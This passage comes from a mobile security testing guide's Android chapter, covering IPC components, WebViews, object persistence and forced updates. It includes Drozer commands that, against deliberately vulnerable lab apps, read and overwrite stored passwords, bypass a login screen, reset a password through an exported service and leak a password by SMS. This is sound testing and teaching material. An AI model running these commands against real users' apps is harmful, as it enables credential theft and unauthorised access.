                final String password = settings.getString("superSecurePassword", null);
                CryptoClass crypt = new CryptoClass();
                String decryptedPassword = crypt.aesDeccryptedString(password);
                String textPhoneno = phn.toString();
                String textMessage = "Updated Password from: "+decryptedPassword+" to: "+newpass;
                SmsManager smsManager = SmsManager.getDefault();
                System.out.println("For the changepassword - phonenumber: "+textPhoneno+" password is: "+textMessage);
smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);
          }
     }
  }
}
```

BroadcastReceivers should use the `android:permission` attribute;  otherwise, other applications can invoke them. You can use `Context.sendBroadcast(intent, receiverPermission);` to specify permissions a receiver must have to [read the broadcast](https://goo.gl/ViRYPC "SendBroadcast"). You can also set an explicit application package name that limits the components this Intent will resolve to. If left as the default value (null), all components in all applications will be considered. If non-null, the Intent can match only the components in the given application package.

#### Dynamic Analysis

You can enumerate IPC components with Drozer. To list all exported IPC components, use the module `app.package.attacksurface`:

```shell
dz> run app.package.attacksurface com.mwr.example.sieve
Attack Surface:
  3 activities exported
  0 broadcast receivers exported
  2 content providers exported
  2 services exported
    is debuggable
```

##### Content Providers

The "Sieve" application implements a vulnerable content provider. To list the content providers exported by the Sieve app, execute the following command:

```shell
dz> run app.provider.finduri com.mwr.example.sieve
Scanning com.mwr.example.sieve...
content://com.mwr.example.sieve.DBContentProvider/
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.DBContentProvider
content://com.mwr.example.sieve.DBContentProvider/Passwords/
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.FileBackupProvider
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Keys
```

Content providers with names like "Passwords" and "Keys" are prime suspects for sensitive information leaks. After all, it wouldn't be good if sensitive keys and passwords could simply be queried from the provider!

```shell
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys
Permission Denial: reading com.mwr.example.sieve.DBContentProvider uri content://com.mwr.example.sieve.DBContentProvider/Keys from pid=4268, uid=10054 requires com.mwr.example.sieve.READ_KEYS, or grantUriPermission()
```

```shell
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
| Password          | pin  |
| SuperPassword1234 | 1234 |
```

This content provider can be accessed without permission.

```shell
dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --string  Password "newpassword"
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
| Password    | pin  |
| newpassword | 1234 |
```

##### Activities

To list activities exported by an application, use the module `app.activity.info`. Specify the target package with `-a` or omit the option to target all apps on the device:

```shell
dz> run app.activity.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  com.mwr.example.sieve.FileSelectActivity
    Permission: null
  com.mwr.example.sieve.MainLoginActivity
    Permission: null
  com.mwr.example.sieve.PWList
    Permission: null  
```

Enumerating activities in the vulnerable password manager "Sieve" shows that the activity `com.mwr.example.sieve.PWList` is exported with no required permissions. It is possible to use the module `app.activity.start` to launch this activity.

```shell
dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
```

Since the activity is called directly in this example, the login form protecting the password manager would be bypassed, and the data contained within the password manager could be accessed.

##### Services

Services can be enumerated with the Drozer module `app.service.info`:

```shell
dz> run app.service.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  com.mwr.example.sieve.AuthService
    Permission: null
  com.mwr.example.sieve.CryptoService
    Permission: null
```

To communicate with a service, you must first use static analysis to identify the required inputs.

Because this service is exported, you can use the module `app.service.send` to communicate with the service and change the password stored in the target application:

```shell
dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg  6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj
Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
  what: 4
  arg1: 42
  arg2: 0
  Empty
```

##### Broadcast Receivers

Broadcasts can be enumerated via the Drozer module `app.broadcast.info`. The target package should be specified via the `-a` parameter:

```shell
dz> run app.broadcast.info -a com.android.insecurebankv2
Package: com.android.insecurebankv2
  com.android.insecurebankv2.MyBroadCastReceiver
    Permission: null
```

In the example app "Android Insecure Bank", one broadcast receiver is exported without requiring any permissions, indicating that we can formulate an intent to trigger the broadcast receiver. When testing broadcast receivers, you must also use static analysis to understand the functionality of the broadcast receiver, as we did before.

With the Drozer module `app.broadcast.send`, we can formulate an intent to trigger the broadcast and send the password to a phone number within our control:

```shell
dz>  run app.broadcast.send --action theBroadcast --extra string phonenumber 07123456789 --extra string newpass 12345
```

This generates the following SMS:

```shell
Updated Password from: SecretPassword@ to: 12345
```

###### Sniffing Intents

If an Android application broadcasts intents without setting a required permission or specifying the destination package, the intents can be monitored by any application that runs on the device.

To register a broadcast receiver to sniff intents, use the Drozer module `app.broadcast.sniff` and specify the action to monitor with the `--action` parameter:

```shell
dz> run app.broadcast.sniff  --action theBroadcast
[*] Broadcast receiver registered to sniff matching intents
[*] Output is updated once a second. Press Control+C to exit.

Action: theBroadcast
Raw: Intent { act=theBroadcast flg=0x10 (has extras) }
Extra: phonenumber=07123456789 (java.lang.String)
Extra: newpass=12345 (java.lang.String)`
```

### Testing JavaScript Execution in WebViews (MSTG-PLATFORM-5)

#### Overview

JavaScript can be injected into web applications via reflected, stored, or DOM-based Cross-Site Scripting (XSS). Mobile apps are executed in a sandboxed environment and don't have this vulnerability when implemented natively. Nevertheless, WebViews may be part of a native app to allow web page viewing. Every app has its own WebView cache, which isn't shared with the native Browser or other apps. On Android, WebViews use the WebKit rendering engine to display web pages, but the pages are stripped down to minimal functions, for example, pages don't have address bars. If the WebView implementation is too lax and allows usage of JavaScript, JavaScript can be used to attack the app and gain access to its data.

#### Static Analysis

The source code must be checked for usage and implementations of the WebView class. To create and use a WebView, you must create an instance of the WebView class.

```Java
WebView webview = new WebView(this);
setContentView(webview);
webview.loadUrl("https://www.owasp.org/");
```

Various settings can be applied to the WebView (activating/deactivating JavaScript is one example). JavaScript is disabled by default for WebViews and must be explicitly enabled. Look for the method [`setJavaScriptEnabled`](https://goo.gl/G9spo2 "setJavaScriptEnabled in WebViews") to check for JavaScript activation.

```Java
webview.getSettings().setJavaScriptEnabled(true);
```

This allows the WebView to interpret JavaScript. It should be enabled only if necessary to reduce the attack surface to the app. If JavaScript is necessary, you should make sure that

- the communication to the endpoints consistently relies on HTTPS (or other protocols that allow encryption) to protect HTML and JavaScript from tampering during transmission
- JavaScript and HTML are loaded locally, from within the app data directory or from trusted web servers only.

To remove all JavaScript source code and locally stored data, clear the WebView's cache with [`clearCache()`](https://goo.gl/7dnhdi "clearCache() in WebViews") when the app closes.

Devices running platforms older than Android 4.4 (API level 19) use a version of WebKit that has several security issues. As a workaround, the app must confirm that WebView objects [display only trusted content](https://developer.android.com/training/articles/security-tips.html#WebView "WebView Best Practices") if the app runs on these devices.

#### Dynamic Analysis

Dynamic Analysis depends on operating conditions. There are several ways to inject JavaScript into an app's WebView:

- Stored Cross-Site Scripting vulnerabilities in an endpoint; the exploit will be sent to the mobile app's WebView when the user navigates to the vulnerable function.
- Attacker takes a man-in-the-middle (MITM) position and tampers with the response by injecting JavaScript.
- Malware tampering with local files that are loaded by the WebView.

To address these attack vectors, check the following:

- All functions offered by the endpoint should be free of [stored XSS](https://goo.gl/6MWZkb "Stored Cross-Site Scripting").
- Only files that are in the app data directory should be rendered in a WebView (see test case "Testing for Local File Inclusion in WebViews").

- The HTTPS communication must be implemented according to best practices to avoid MITM attacks. This means:
  - all communication is encrypted via TLS (see test case "Testing for Unencrypted Sensitive Data on the Network"),
  - the certificate is checked properly (see test case "Testing Endpoint Identify Verification"), and/or
  - the certificate should be pinned (see "Testing Custom Certificate Stores and SSL Pinning").

### Testing WebView Protocol Handlers (MSTG-PLATFORM-6)

#### Overview

Several default [schemas](https://developer.android.com/guide/appendix/g-app-intents.html "Intent List") are available for Android URLs. They can be triggered within a WebView with the following:

- http(s)://
- file://
- tel://

WebViews can load remote content from an endpoint, but they can also load local content from the app data directory or external storage. If the local content is loaded, the user shouldn't be able to influence the filename or the path used to load the file, and users shouldn't be able to edit the loaded file.

#### Static Analysis

Check the source code for WebView usage. The following [WebView settings](https://developer.android.com/reference/android/webkit/WebSettings.html "WebView Settings") control resource access:

- `setAllowContentAccess`: Content URL access allows WebViews to load content from a content provider installed on the system, which is enabled by default .
- `setAllowFileAccess`: Enables and disables file access within a WebView. File access is enabled by default. Note that this enables and disables [file system access](https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess%28boolean%29 "File Access in WebView") only. Asset and resource access is unaffected and accessible via `file:///android_asset` and `file:///android_res`.
- `setAllowFileAccessFromFileURLs`: Does or does not allow JavaScript running in the context of a file scheme URL to access content from other file scheme URLs. The default value is true for API level 15 (Ice Cream Sandwich) and below and false for API level 16 (Jelly Bean) and above.
- `setAllowUniversalAccessFromFileURLs`: Does or does not allow JavaScript running in the context of a file scheme URL to access content from any origin. The default value is true for API level 15 (Ice Cream Sandwich) and below and false for API level 16 (Jelly Bean) and above.

If one or more of the above methods is/are activated, you should determine whether the method(s) is/are really necessary for the app to work properly.

If a WebView instance can be identified, find out whether local files are loaded with the [`loadURL()`](https://goo.gl/4vdSQM "loadURL() in WebView") method.

```Java
WebView = new WebView(this);
webView.loadUrl("file:///android_asset/filename.html");
```

The location from which the HTML file is loaded must be verified. If the file is loaded from external storage, for example, the file is readable and writable by everyone. This is considered a bad practice. Instead, the file should be placed in the app's assets directory.

```java
webview.loadUrl("file:///" +
Environment.getExternalStorageDirectory().getPath() +
"filename.html");
```

The URL specified in `loadURL` should be checked for dynamic parameters that can be manipulated; their manipulation may lead to local file inclusion.

Use the following [code snippet and best practices](https://github.com/nowsecure/secure-mobile-development/blob/master/en/android/webview-best-practices.md#remediation "WebView best practices") to deactivate protocol handlers, if applicable:

```java
//If attackers can inject script into a WebView, they could access local resources. This can be prevented by disabling local file system access, which is enabled by default. You can use the Android WebSettings class to disable local file system access via the public method `setAllowFileAccess`.
webView.getSettings().setAllowFileAccess(false);

webView.getSettings().setAllowFileAccessFromFileURLs(false);

webView.getSettings().setAllowUniversalAccessFromFileURLs(false);

webView.getSettings().setAllowContentAccess(false);
```

- Create a whitelist that defines local and remote web pages and protocols that are allowed to be loaded.
- Create checksums of the local HTML/JavaScript files and check them while the app is starting up. Minify JavaScript files to make them harder to read.

#### Dynamic Analysis

To identify the usage of protocol handlers, look for ways to trigger phone calls and ways to access files from the file system while you're using the app.

### Determining Whether Java Objects Are Exposed Through WebViews (MSTG-PLATFORM-7)

#### Overview

Android offers a way for JavaScript executed in a WebView to call and use native functions of an Android app: [`addJavascriptInterface`](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29 "Method addJavascriptInterface()").

The `addJavascriptInterface` method allows you to expose Java Objects to WebViews. When you use this method in an Android app, JavaScript in a WebView can invoke the Android app's native methods.

Before Android 4.2 Jelly Bean (API Level 17), [a vulnerability was discovered](https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/ "WebView addJavascriptInterface Remote Code Execution") in the implementation of `addJavascriptInterface`: a reflection that leads to remote code execution when malicious JavaScript is injected into a WebView.

This vulnerability was fixed by API Level 17, and the access to Java Object methods granted to JavaScript was changed. When you use `addJavascriptInterface`, methods of Java Objects are only accessible to JavaScript when the annotation `@JavascriptInterface` is added. Before API Level 17, all Java Object methods were accessible by default.

An app that targets an Android version older than Android 4.2 is still vulnerable to the flaw in `addJavascriptInterface` and should be used only with extreme care. Several best practices should be used when this method is necessary.

#### Static Analysis

You need to determine whether the method `addJavascriptInterface` is used, how it is used, and whether an attacker can inject malicious JavaScript.

The following example shows how `addJavascriptInterface` is used to bridge a Java Object and JavaScript in a WebView:

```Java
WebView webview = new WebView(this);
WebSettings webSettings = webview.getSettings();
webSettings.setJavaScriptEnabled(true);

MSTG_ENV_008_JS_Interface jsInterface = new MSTG_ENV_008_JS_Interface(this);

myWebView.addJavascriptInterface(jsInterface, "Android");
myWebView.loadURL("http://example.com/file.html");
setContentView(myWebView);
```

In Android API levels 17 and above, an annotation called `JavascriptInterface` explicitly allows JavaScript to access a Java method.

```Java
public class MSTG_ENV_008_JS_Interface {

        Context mContext;

        /** Instantiate the interface and set the context */
        MSTG_ENV_005_JS_Interface(Context c) {
            mContext = c;
        }

        @JavascriptInterface
        public String returnString () {
            return "Secret String";
        }

        /** Show a toast from the web page */
        @JavascriptInterface
        public void showToast(String toast) {
            Toast.makeText(mContext, toast, Toast.LENGTH_SHORT).show();
        }
}
```

If the annotation `@JavascriptInterface` is defined for a method, it can be called by JavaScript. If the app targets API level < 17, all Java Object methods are exposed by default to JavaScript and can be called.

The method `returnString` can then be called in JavaScript in order to retrieve the return value. The value is then stored in the parameter `result`.

```Javascript
var result = window.Android.returnString();
```

With access to the JavaScript code, via, for example, stored XSS or a MITM attack, an attacker can directly call the exposed Java methods.

If `addJavascriptInterface` is necessary, only JavaScript provided with the APK should be allowed to call it; no JavaScript should be loaded from remote endpoints.

Another solution is limiting the API level to 17 (JELLY_BEAN_MR1) and above in the manifest file of the app. Only public methods that are [annotated with `JavascriptInterface`](https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=129859614 "DRD13 addJavascriptInterface()") can be accessed via JavaScript at these API levels.

```xml
<uses-sdk android:minSdkVersion="17" />
...

</manifest>
```

#### Dynamic Analysis

Dynamic analysis of the app can show you which HTML or JavaScript files are loaded and which vulnerabilities are present. The procedure for exploiting the vulnerability starts with producing a JavaScript payload and injecting it into the file that the app is requesting. The injection can be accomplished via a MITM attack or direct modification of the file if it is stored in external storage. The whole process can be accomplished via Drozer and weasel (MWR's advanced exploitation payload), which can install a full agent, injecting a limited agent into a running process or connecting a reverse shell as a Remote Access Tool (RAT).

A full description of the attack is included in the [blog article by MWR](https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/ "WebView addJavascriptInterface Remote Code Execution").

### Testing Object Persistence (MSTG-PLATFORM-8)

#### Overview

There are several ways to persist an object on Android:

##### Object Serialization

An object and its data can be represented as a sequence of bytes. This is done in Java via [object serialization](https://developer.android.com/reference/java/io/Serializable.html "Serializable"). Serialization is not inherently secure. It is just a binary format (or representation) for locally storing data in a .ser file. Encrypting and signing HMAC-serialized data is possible as long as the keys are stored safely. Deserializing an object requires a class of the same version as the class used to serialize the object. After classes have been changed, the `ObjectInputStream` can't create objects from older .ser files. The example below shows how to create a `Serializable` class by implementing the `Serializable` interface.

```java
import java.io.Serializable;

public class Person implements Serializable {
  private String firstName;
  private String lastName;

  public Person(String firstName, String lastName) {
    this.firstName = firstName;
    this.lastName = lastName;
    }
  //..
  //getters, setters, etc
  //..

}

```

Now you can read/write the object with `ObjectInputStream`/`ObjectOutputStream` in another class.

##### JSON

There are several ways to serialize the contents of an object to JSON. Android comes with the `JSONObject` and `JSONArray` classes. A wide variety of libraries, including [GSON](https://github.com/google/gson "Google Gson"), [Jackson](https://github.com/FasterXML/jackson-core "Jackson core"), [Moshi](https://github.com/square/moshi "Moshi"), can also be used. The main differences between the libraries are whether they use reflection to compose the object, whether they support annotations, whether the create immutable objects, and the amount of memory they use. Note that almost all the JSON representations are String-based and therefore immutable. This means that any secret stored in JSON will be harder to remove from memory.
JSON itself can be stored anywhere, e.g., a (NoSQL) database or a file. You just need to make sure that any JSON that contains secrets has been appropriately protected (e.g., encrypted/HMACed). See the data storage chapter for more details. A simple example (from the GSON User Guide) of writing and reading JSON with GSON follows. In this example, the contents of an instance of the `BagOfPrimitives` is serialized into JSON:

```java
class BagOfPrimitives {
  private int value1 = 1;
  private String value2 = "abc";
  private transient int value3 = 3;
  BagOfPrimitives() {
    // no-args constructor
  }
}

// Serialization
BagOfPrimitives obj = new BagOfPrimitives();
Gson gson = new Gson();
String json = gson.toJson(obj);  

// ==> json is {"value1":1,"value2":"abc"}

```

##### XML

There are several ways to serialize the contents of an object to XML and back. Android comes with the `XmlPullParser` interface which allows for easily maintainable XML parsing. There are two implementations within Android: `KXmlParser` and `ExpatPullParser`. The [Android Developer Guide](https://developer.android.com/training/basics/network-ops/xml#java "Instantiate the parser") provides a great write-up on how to use them. Next, there are various alternatives, such as a `SAX` parser that comes with the Java runtime. For more information, see [a blogpost from ibm.com](https://www.ibm.com/developerworks/opensource/library/x-android/index.html "Working with XML on Android on IBM Developer").
Similarly to JSON, XML has the issue of working mostly String based, which means that String-type secrets will be harder to remove from memory. XML data can be stored anywhere (database, files), but do need additional protection in case of secrets or information that should not be changed. See the data storage chapter for more details. As stated earlier: the true danger in XML lies in the XML eXternal Entity attack (XXE) as it might allow for reading external data sources that are still accessible within the application.

##### ORM

There are libraries that provide functionality for directly storing the contents of an object in a database and then instantiating the object with the database contents. This is called Object-Relational Mapping (ORM). Libraries that use the SQLite database include

- [OrmLite](http://ormlite.com/ "OrmLite"),
- [SugarORM](https://satyan.github.io/sugar/ "Sugar ORM"),
- [GreenDAO](http://greenrobot.org/greendao/ "GreenDAO") and
- [ActiveAndroid](http://www.activeandroid.com/ "ActiveAndroid").

[Realm](https://realm.io/docs/java/latest/ "Realm Java"), on the other hand, uses its own database to store the contents of a class. The amount of protection that ORM can provide depends primarily on whether the database is encrypted. See the data storage chapter for more details. The Realm website includes a nice [example of ORM Lite](https://github.com/j256/ormlite-examples/tree/master/android/HelloAndroid "OrmLite example").

##### Parcelable

[`Parcelable`](https://developer.android.com/reference/android/os/Parcelable.html "Parcelable") is an interface for classes whose instances can be written to and restored from a [`Parcel`](https://developer.android.com/reference/android/os/Parcel.html "Parcel"). Parcels are often used to pack a class as part of a `Bundle` for an `Intent`. Here's an Android developer documentation example that implements `Parcelable`:

```java
public class MyParcelable implements Parcelable {
     private int mData;

     public int describeContents() {
         return 0;
     }

     public void writeToParcel(Parcel out, int flags) {
         out.writeInt(mData);
     }

     public static final Parcelable.Creator<MyParcelable> CREATOR
             = new Parcelable.Creator<MyParcelable>() {
         public MyParcelable createFromParcel(Parcel in) {
             return new MyParcelable(in);
         }

         public MyParcelable[] newArray(int size) {
             return new MyParcelable[size];
         }
     };

     private MyParcelable(Parcel in) {
         mData = in.readInt();
     }
 }
```

Because this mechanism that involves Parcels and Intents may change over time, and the `Parcelable` may contain `IBinder` pointers, storing data to disk via `Parcelable` is not recommended.

##### Protocol Buffers

[Protocol Buffers](https://developers.google.com/protocol-buffers/ "Google Documentation") by Google, are a platform- and language neutral mechanism for serializing structured data by means of the [Binary Data Format](https://developers.google.com/protocol-buffers/docs/encoding "Encoding").
There have been a few vulnerabilities with Protocol Buffers, such as [CVE-2015-5237](https://www.cvedetails.com/cve/CVE-2015-5237/ "CVE-2015-5237").
Note that Protocol Buffers do not provide any protection for confidentiality: there is no built in encryption.

#### Static Analysis

If object persistence is used for storing sensitive information on the device, first make sure that the information is encrypted and signed/HMACed. See the chapters on data storage and cryptographic management for more details. Next, make sure that the decryption and verification keys are obtainable only after the user has been authenticated. Security checks should be carried out at the correct positions, as defined in [best practices](https://wiki.sei.cmu.edu/confluence/display/java/SER04-J.%20Do%20not%20allow%20serialization%20and%20deserialization%20to%20bypass%20the%20security%20manager "SER04-J. Do not allow serialization and deserialization to bypass the security manager").

There are a few generic remediation steps that you can always take:

1. Make sure that sensitive data has been encrypted and HMACed/signed after serialization/persistence. Evaluate the signature or HMAC before you use the data. See the chapter about cryptography for more details.
2. Make sure that the keys used in step 1 can't be extracted easily. The user and/or application instance should be properly authenticated/authorized to obtain the keys. See the data storage chapter for more details.
3. Make sure that the data within the de-serialized object is carefully validated before it is actively used (e.g., no exploit of business/application logic).

For high-risk applications that focus on availability, we recommend that you use `Serializable` only when the serialized classes are stable. Second, we recommend not using reflection-based persistence because

- the attacker could find the method's signature via the String-based argument
- the attacker might be able to manipulate the reflection-based steps to execute business logic.

See the anti-reverse-engineering chapter for more details.

##### Object Serialization

Search the source code for the following keywords:

- `import java.io.Serializable`
- `implements Serializable`

##### JSON

If you need to counter memory-dumping, make sure that very sensitive information is not stored in the JSON format because you can't guarantee prevention of anti-memory dumping techniques with the standard libraries. You can check for the following keywords in the corresponding libraries:

**`JSONObject`** Search the source code for the following keywords:

- `import org.json.JSONObject;`
- `import org.json.JSONArray;`

**`GSON`** Search the source code for the following keywords:

- `import com.google.gson`
- `import com.google.gson.annotations`
- `import com.google.gson.reflect`
- `import com.google.gson.stream`
- `new Gson();`
- Annotations such as `@Expose`, `@JsonAdapter`, `@SerializedName`,`@Since`, and `@Until`

**`Jackson`** Search the source code for the following keywords:

- `import com.fasterxml.jackson.core`
- `import org.codehaus.jackson` for the older version.

##### ORM

When you use an ORM library, make sure that the data is stored in an encrypted database and the class representations are individually encrypted before storing it. See the chapters on data storage and cryptographic management for more details. You can check for the following keywords in the corresponding libraries:

**`OrmLite`** Search the source code for the following keywords:

- `import com.j256.*`
- `import com.j256.dao`
- `import com.j256.db`
- `import com.j256.stmt`
- `import com.j256.table\`

Please make sure that logging is disabled.

**`SugarORM`** Search the source code for the following keywords:

- `import com.github.satyan`
- `extends SugarRecord<Type>`
- In the AndroidManifest, there will be `meta-data` entries with values such as `DATABASE`, `VERSION`, `QUERY_LOG` and `DOMAIN_PACKAGE_NAME`.

Make sure that `QUERY_LOG` is set to false.

**`GreenDAO`** Search the source code for the following keywords:

- `import org.greenrobot.greendao.annotation.Convert`
- `import org.greenrobot.greendao.annotation.Entity`
- `import org.greenrobot.greendao.annotation.Generated`
- `import org.greenrobot.greendao.annotation.Id`
- `import org.greenrobot.greendao.annotation.Index`
- `import org.greenrobot.greendao.annotation.NotNull`
- `import org.greenrobot.greendao.annotation.*`
- `import org.greenrobot.greendao.database.Database`
- `import org.greenrobot.greendao.query.Query`

**`ActiveAndroid`** Search the source code for the following keywords:

- `ActiveAndroid.initialize(<contextReference>);`
- `import com.activeandroid.Configuration`
- `import com.activeandroid.query.*`

**`Realm`** Search the source code for the following keywords:

- `import io.realm.RealmObject;`
- `import io.realm.annotations.PrimaryKey;`

##### Parcelable

Make sure that appropriate security measures are taken when sensitive information is stored in an Intent via a Bundle that contains a Parcelable. Use explicit Intents and verify proper additional security controls when using application-level IPC (e.g., signature verification, intent-permissions, crypto).

#### Dynamic Analysis

There are several ways to perform dynamic analysis:

1. For the actual persistence: Use the techniques described in the data storage chapter.
2. For reflection-based approaches: Use Xposed to hook into the deserialization methods or add unprocessable information to the serialized objects to see how they are handled (e.g., whether the application crashes or extra information can be extracted by enriching the objects).

### Testing enforced updating (MSTG-ARCH-9)

Starting from API level 21 (Android 5.0), together with the Play Core Library, apps can be forced to be updated. This mechanism is based on using the `AppUpdateManager`. Before that, other mechanisms were used, such as doing http calls to the Google Play Store, which are not as reliable as the APIs of the Play Store might change. Alternatively, Firebase could be used to check for possible forced updates as well (see this [blog](https://medium.com/@sembozdemir/force-your-users-to-update-your-app-with-using-firebase-33f1e0bcec5a "Force users to update the app using Firebase")).
Enforced updating can be really helpful when it comes to public key pinning (see the Testing Network communication for more details) when a pin has to be refreshed due to a certificate/public key rotation. Next, vulnerabilities are easily patched by means of forced updates.

Please note that newer versions of an application will not fix security issues that are living in the back-ends to which the app communicates. Allowing an app not to communicate with it might not be enough. Having proper API-lifecycle management is key here.
Similarly, when a user is not forced to update, do not forget to test older versions of your app against your API and/or use proper API versioning.

#### Static analysis

The code sample below shows the example of an app-update:

```java
//Part 1: check for update
// Creates instance of the manager.
AppUpdateManager appUpdateManager = AppUpdateManagerFactory.create(context);

// Returns an intent object that you use to check for an update.
Task<AppUpdateInfo> appUpdateInfo = appUpdateManager.getAppUpdateInfo();

// Checks that the platform will allow the specified type of update.
if (appUpdateInfo.updateAvailability() == UpdateAvailability.UPDATE_AVAILABLE
      // For a flexible update, use AppUpdateType.FLEXIBLE
      && appUpdateInfo.isUpdateTypeAllowed(AppUpdateType.IMMEDIATE)) {



                  //...Part 2: request update
                  appUpdateManager.startUpdateFlowForResult(
                     // Pass the intent that is returned by 'getAppUpdateInfo()'.
                     appUpdateInfo,
                     // Or 'AppUpdateType.FLEXIBLE' for flexible updates.
                     AppUpdateType.IMMEDIATE,
                     // The current activity making the update request.
                     this,
                     // Include a request code to later monitor this update request.
                     MY_REQUEST_CODE);



                     //...Part 3: check if update completed succesfully
 @Override
 public void onActivityResult(int requestCode, int resultCode, Intent data) {
   if (myRequestCode == MY_REQUEST_CODE) {
     if (resultCode != RESULT_OK) {
       log("Update flow failed! Result code: " + resultCode);
       // If the update is cancelled or fails,
       // you can request to start the update again in case of forced updates
     }
   }
 }

 //..Part 4:
 // Checks that the update is not stalled during 'onResume()'.
// However, you should execute this check at all entry points into the app.
@Override
protected void onResume() {
  super.onResume();

  appUpdateManager
      .getAppUpdateInfo()
      .addOnSuccessListener(
          appUpdateInfo -> {
            ...
            if (appUpdateInfo.updateAvailability()
                == UpdateAvailability.DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS) {
                // If an in-app update is already running, resume the update.
                manager.startUpdateFlowForResult(
                    appUpdateInfo,
                    IMMEDIATE,
                    this,
                    MY_REQUEST_CODE);
            }
          });
}
}
```

>Source: [https://developer.android.com/guide/app-bundle/in-app-updates](https://developer.android.com/guide/app-bundle/in-app-updates)

When checking for a proper update mechanism, make sure the usage of the `AppUpdateManager` is present. If it is not yet, then this means that users might be able to remain on an older version of the application with the given vulnerabilities.
Next, pay attention to the `AppUpdateType.IMMEDIATE` use: if a security update comes in, then this flag should be used in order to make sure that the user cannot go forward with using the app without updating it.
As you can see, in part 3 of the example: make sure that cancellations or errors do end up in re-checks and that a user cannot move forward in case of a critical security update.
Finally, in part 4: you can see that for every entrypoint in the application, an update-mechanism should be enforced, so that bypassing it will be harder.

#### Dynamic analysis

In order to test for proper updating: try downloading an older version of the application with a security vulnerability, either by a release from the developers or by using a third party app-store.
Next, verify whether or not you can continue to use the application without updating it. If an update prompt is given, verify if you can still use the application by canceling the prompt or otherwise circumventing it through normal application usage. This includes validating whether the back-end will stop calls to vulnerable back-ends and/or whether the vulnerable app-version itself is blocked by the back-end.
Lastly, see if you can play with the version number of a man-in-the-middled app and see how the backend responds to this (and if it is recorded at all for instance).

### References

#### Android App Bundles and updates

- <https://developer.android.com/guide/app-bundle/in-app-updates>

#### Android Fragment Injection

- <https://www.synopsys.com/blogs/software-security/fragment-injection/>
- <https://securityintelligence.com/wp-content/uploads/2013/12/android-collapses-into-fragments.pdf>

#### Android Permissions Documentation

- <https://developer.android.com/training/permissions/usage-notes>
- <https://developer.android.com/training/permissions/requesting#java>
- <https://developer.android.com/guide/topics/permissions/overview#permission-groups>
- <https://developer.android.com/guide/topics/manifest/provider-element#gprmsn>
- <https://developer.android.com/reference/android/content/Context#revokeUriPermission(android.net.Uri,%20int)>
- <https://developer.android.com/reference/android/content/Context#checkUriPermission(android.net.Uri,%20int,%20int,%20int)>
- <https://developer.android.com/guide/components/broadcasts#restricting_broadcasts_with_permissions>
- <https://developer.android.com/guide/topics/permissions/overview>
- <https://developer.android.com/guide/topics/manifest/manifest-intro#filestruct>

#### Android permissions changes in Android 8

- <https://developer.android.com/about/versions/oreo/android-8.0-changes>

#### OWASP Mobile Top 10 2016

- M7 - Poor Code Quality - <https://www.owasp.org/index.php/Mobile_Top_10_2016-M7-Poor_Code_Quality>

#### OWASP MASVS

- MSTG-PLATFORM-1: "The app only requests the minimum set of permissions necessary."
- MSTG-PLATFORM-2: "All inputs from external sources and the user are validated and if necessary sanitized. This includes data received via the UI, IPC mechanisms such as intents, custom URLs, and network sources."
- MSTG-PLATFORM-3: "The app does not export sensitive functionality via custom URL schemes, unless these mechanisms are properly protected."
- MSTG-PLATFORM-4: "The app does not export sensitive functionality through IPC facilities, unless these mechanisms are properly protected."
- MSTG-PLATFORM-5: "JavaScript is disabled in WebViews unless explicitly required."
- MSTG-PLATFORM-6: "WebViews are configured to allow only the minimum set of protocol handlers required (ideally, only https is supported). Potentially dangerous handlers, such as file, tel and app-id, are disabled."
- MSTG-PLATFORM-7: "If native methods of the app are exposed to a WebView, verify that the WebView only renders JavaScript contained within the app package."
- MSTG-PLATFORM-8: "Object serialization, if any, is implemented using safe serialization APIs."
- MSTG-ARCH-9: "A mechanism for enforcing updates of the mobile app exists."

#### CWE

- CWE-79 - Improper Neutralization of Input During Web Page Generation
- CWE-200 - Information Leak / Disclosure
- CWE-749 - Exposed Dangerous Method or Function
- CWE-939 - Improper Authorization in Handler for Custom URL Scheme

#### Tools

- Drozer - <https://github.com/mwrlabs/drozer>
